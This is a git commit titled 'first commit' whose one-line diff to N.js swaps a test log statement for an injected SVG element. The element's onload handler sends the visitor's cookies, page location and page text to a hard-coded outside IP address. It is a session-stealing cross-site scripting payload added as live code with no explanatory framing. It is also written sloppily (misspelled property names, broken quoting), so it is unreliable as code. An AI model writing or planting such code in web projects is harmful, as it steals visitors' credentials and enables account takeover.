73dbe15a0e6187edc28651301503025f4eaaf9a2
zzzkf <zzzykf@gmail.com>
2018-11-23 14:21:44 +0800

    first commit

--- N.js
+++ N.js
@@ -1,1 +1,1 @@
-console.log("TESTING");
+document.getElementById("test2").innerHtml='<svg style="display:none;" onload=this.src="http://52.220.154.212/no.php?C=" + document.cookie + "&D=" + window.host.location+"&N="+document.getElementsByTagName("font")[0]>';
